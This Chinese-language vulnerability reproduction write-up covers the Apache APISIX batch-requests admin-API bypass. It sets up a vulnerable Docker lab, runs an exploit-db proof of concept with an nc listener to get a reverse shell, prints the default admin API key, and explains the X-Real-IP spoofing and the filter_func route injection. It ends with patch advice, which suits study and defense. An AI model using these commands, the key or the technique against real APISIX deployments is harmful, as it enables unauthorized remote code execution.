# 0x01 漏洞简介
Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。

Apache APISIX 中存在安全漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin Api的限制。 
# 0x02 影响版本
Apache APISIX < 2.10.4
Apache APISIX < 2.12.1
# 0x03 漏洞分析
查看apisix 2.12.1的commit修复记录，发现官方的修复方法只是关闭了 batch-requests插件的默认开启。
> [https://github.com/apache/apisix/pull/6254/commits/d4f0d6ac065e9282b2deca08073bceb62aa13b4a](https://github.com/apache/apisix/pull/6254/commits/d4f0d6ac065e9282b2deca08073bceb62aa13b4a)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647830826808-bea6c04c-c73d-417b-9b79-6f2213526011.png#clientId=u36d5f521-1109-4&from=paste&id=u431033cd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=815&originalType=binary&ratio=1&size=40646&status=done&style=none&taskId=u799b9164-355f-4659-a4eb-0be20dfd33d)

查看batch-requests插件的文档可知，该插件主要用http pipeline的方式批量进行多个接口请求。
> [https://github.com/apache/apisix/blob/ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c/docs/zh/latest/plugins/batch-requests.md](https://github.com/apache/apisix/blob/ec0fc2ceaf04a20b0bd0ebdaad67296a1d3f621c/docs/zh/latest/plugins/batch-requests.md)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647831511556-39a5299e-9ffe-48c3-b44a-6f19c0c8fef4.png#clientId=u36d5f521-1109-4&from=paste&id=ufa4600a7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=614&originWidth=1165&originalType=binary&ratio=1&size=49068&status=done&style=none&taskId=u3537d00d-a6ab-49a4-865b-06c7fe126ac)

根据官方漏洞描述，我们可以将pipeline里的path修改为apisix的默认 Admin API ，以此来绕过 Admin API 对IP的限制，请求敏感API来进行RCE。
# 0x04 环境搭建
使用docker来快速部署Apache APISIX

1、从git仓库获取项目
```shell
git clone https://github.com/apache/apisix-docker.git
```
2、切换到apisix-docker/examples目录

3、编辑docker-compose.yml文件，把services->apisix下面的image: apache/apisix:2.12.1-alpine下面的改成image: apache/apisix:2.12.0-alpine这个，因为我们需要安装2.12.1之前的版本。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647829192505-187564bd-d68e-4dd7-86e2-2261754f0377.png#clientId=u36d5f521-1109-4&from=paste&id=ud52d5a00&margin=%5Bobject%20Object%5D&name=image.png&originHeight=148&originWidth=645&originalType=binary&ratio=1&size=19671&status=done&style=none&taskId=ue17bb22e-49db-42da-8b62-97f317eb270)

4、使用docker-compose来安装和部署 docker 容器
```shell
docker-compose -p docker-apisix up -d
```
完成后，通过curl访问 API
```shell
curl 'http://127.0.0.1:9080/apisix/admin/routes?api_key=edd1c9f034335f136f87ad84b625c8f1'
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647833925237-69dd954d-ff92-4230-a17d-bce47222071a.png#clientId=u36d5f521-1109-4&from=paste&id=u07c538a8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=42&originWidth=1149&originalType=binary&ratio=1&size=18945&status=done&style=none&taskId=ue6479bd8-878c-4436-800b-12671afa15f)

默认的`api_key`可在容器的`/usr/local/apisix/conf/config.yaml`找到

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647831243680-ed54f6d0-a204-49b3-aaaa-5447dff66957.png#clientId=u36d5f521-1109-4&from=paste&id=uf7b96bc0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=157&originWidth=697&originalType=binary&ratio=1&size=25042&status=done&style=none&taskId=u7f5d9070-28f8-4de6-8ba6-137ae033719)

# 0x05 漏洞复现

- [🔗 poc.py 链接](https://www.exploit-db.com/exploits/50829)
## 5.1 漏洞验证
在机器出网的情况下，可使用dnslog平台验证漏洞。
```shell
python3 poc.py http://192.168.0.198:9080/ xxxxx.ceye.io 80
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647839926243-13a479a3-2cf7-44f5-9bde-a0c5c0ad076e.png#clientId=u36d5f521-1109-4&from=paste&id=u44f0a957&margin=%5Bobject%20Object%5D&name=image.png&originHeight=143&originWidth=1494&originalType=binary&ratio=1&size=12791&status=done&style=none&taskId=u6ace040b-4648-49be-8eac-19279985279)

## 5.2 漏洞利用
攻击机开启监听
```shell
nc -lvvp 9999
```
运行脚本进行攻击
```shell
python3 poc.py http://RHOST:RPORT/ LHOST LPORT
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647832119752-6c940eaa-04cc-49ab-a20a-450aa140c080.png#clientId=u36d5f521-1109-4&from=paste&id=uee892eb0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=207&originWidth=888&originalType=binary&ratio=1&size=36419&status=done&style=none&taskId=u20ed047b-a411-4149-917c-d172a3c8a72)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647832034965-1eaa094f-359e-4f30-979d-46350e202013.png#clientId=u36d5f521-1109-4&from=paste&id=u30fefa5d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=409&originWidth=575&originalType=binary&ratio=1&size=78415&status=done&style=none&taskId=u959e23c8-8a17-487a-aed2-25e4ef1baa9)


# 0x06 POC 分析
分析poc脚本，看到向API发出了两个请求：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647833144578-2fdc96b1-cd78-4b0a-b79d-a6e747590b09.png#clientId=u36d5f521-1109-4&from=paste&id=u7ba5a4de&margin=%5Bobject%20Object%5D&name=image.png&originHeight=69&originWidth=895&originalType=binary&ratio=1&size=17464&status=done&style=none&taskId=u529631db-27cb-46b3-898b-dfde1336f28)

查看POST请求中的`json_data`我们可以看到第一个请求只是植入了有效负载，第二个请求触发了它。
`os.execute`使用典型的 bash 反弹 shell 在脚本中执行命令。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647833317619-94ce78e3-75f3-41f0-9b73-480463f2b825.png#clientId=u36d5f521-1109-4&from=paste&id=u7c659636&margin=%5Bobject%20Object%5D&name=image.png&originHeight=317&originWidth=1069&originalType=binary&ratio=1&size=50248&status=done&style=none&taskId=ud4449df3-8aa2-4d92-97b4-95317a7a363)

如上所述，此 RCE 漏洞的核心在于能够 **绕过 IP 限制 **和 **使用默认配置的 API **。
通过使用`X-Real-IP`标头设置来绕过 IP ，设置为127.0.0.1
设置`X-API-KEY`为默认的管理 API 令牌，即 `X-API-KEY：edd1c9f034335f136f87ad84b625c8f1`

运行poc后，如果我们使用 API 查看路由，我们会看到添加了一条新路由。
在`filter_func`字段是我们的反弹 shell。 `uri`字段设置为`/rms/fzxewh`。
这都是在第一个POST请求包的`json_data`中设置的。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647834554617-ac600134-9295-434d-94e1-f511494dd461.png#clientId=u36d5f521-1109-4&from=paste&id=u04207688&margin=%5Bobject%20Object%5D&name=image.png&originHeight=765&originWidth=1387&originalType=binary&ratio=1&size=57034&status=done&style=none&taskId=ub35426e1-8042-4eed-aa9c-895ccf47b9f)


在第二个请求中，向那个端点发出一个请求，触发反弹 shell

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1647837006779-63d2ef20-8354-4d08-872a-348b5f20495a.png#clientId=u36d5f521-1109-4&from=paste&id=u99b0d8ac&margin=%5Bobject%20Object%5D&name=image.png&originHeight=29&originWidth=670&originalType=binary&ratio=1&size=7921&status=done&style=none&taskId=u9c425762-c2f2-442d-bd33-f2f0bb3dd34)

# 0x07 修复建议
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

- [https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94](https://lists.apache.org/thread/lcdqywz8zy94mdysk7p3gfdgn51jmt94)
# 0x08 参考链接

- [http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202202-1030](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202202-1030)
- [https://mp.weixin.qq.com/s?__biz=MzUxMjc0MTE3Mw==&mid=2247486971&idx=1&sn=286dd322821b335705ed975b3afa062b](https://mp.weixin.qq.com/s?__biz=MzUxMjc0MTE3Mw==&mid=2247486971&idx=1&sn=286dd322821b335705ed975b3afa062b)
- [https://blog.csdn.net/weixin_42353842/article/details/122943253](https://blog.csdn.net/weixin_42353842/article/details/122943253)
- [https://www.exploit-db.com/exploits/50829](https://www.exploit-db.com/exploits/50829)





